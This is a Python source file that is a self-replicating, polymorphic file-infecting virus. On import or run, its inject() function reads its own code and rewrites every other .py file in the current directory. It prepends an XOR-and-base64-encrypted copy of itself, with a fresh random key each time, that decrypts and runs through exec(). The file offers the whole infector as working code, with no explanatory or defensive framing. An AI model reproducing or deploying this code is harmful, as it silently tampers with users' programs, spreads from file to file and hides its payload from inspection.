import glob
import hashlib
import os
import base64
import random
import string


# Encoder Decoder source https://stackoverflow.com/a/70040320


def encrypt(clearText, key):

    reps = (len(clearText)-1)//len(key) + 1
    encoded = clearText.encode("ascii")

    key = (key * reps)[:len(clearText)].encode("ascii")

    cipherText = bytes([i1 ^ i2 for (i1, i2) in zip(encoded, key)])

    # Return base64 string
    return base64.b64encode(cipherText).decode("ascii")


def decrypt(cipherText, key):
    reps = (len(cipherText)-1)//len(key) + 1
    encoded64_bytes = cipherText.encode("ascii")

    encoded_bytes = base64.b64decode(encoded64_bytes)

    key = (key * reps)[:len(cipherText)].encode("ascii")

    clearText = bytes([i1 ^ i2 for (i1, i2) in zip(encoded_bytes, key)])
    return clearText.decode("ascii")

# DELIMITER:CRYPTO

# DELIMITER:START


def inject():

    injection = open(__file__, "r")
    injectionText = injection.read()
    injection.close()

    injectionText = injectionText.split("# DELIMITER:END\n")[
        0] + "# DELIMITER:END\n"

    injectionCryptoText = injectionText.split("# DELIMITER:CRYPTO\n")[
        0] + "# DELIMITER:CRYPTO\n"

    # Get all python files in the current directory
    pyFiles = glob.glob("*.py")

    # Remove the initial
    pyFiles.remove(os.path.split(__file__)[1])

    for file in pyFiles:

        script = open(file, "r")
        scriptText = script.read()

        checksum = hashlib.md5(file.encode("ascii")).hexdigest()
        firstLine = scriptText.split("\n")[0]

        if checksum in firstLine:
            continue

        injected = open(file + ".injected", "w")

        injected.write("# Checksum = " + checksum + "\n" + injectionCryptoText + encryptInjection(
            injectionText.split("# DELIMITER:CRYPTO\n")[1]) + "\n" + scriptText)

        script.close()
        injected.close()
        os.unlink(file)
        os.rename(file + ".injected", file)


def encryptInjection(injection):

    key = ""

    for i in range(64):
        key += random.choice(string.ascii_letters + "123456789")

    key_bytes = key.encode("ascii")
    base64_bytes = base64.b64encode(key_bytes)
    base64_key = base64_bytes.decode('ascii')

    encryptedInjection = encrypt(injection, key)

    payload = """
encryptedInjection = "{}"
key = "{}"

injectionText = decrypt(encryptedInjection, base64.b64decode(key.encode("ascii")).decode("ascii"))

exec(injectionText)
    """.format(encryptedInjection, base64_key)

    return payload


inject()

# DELIMITER:END
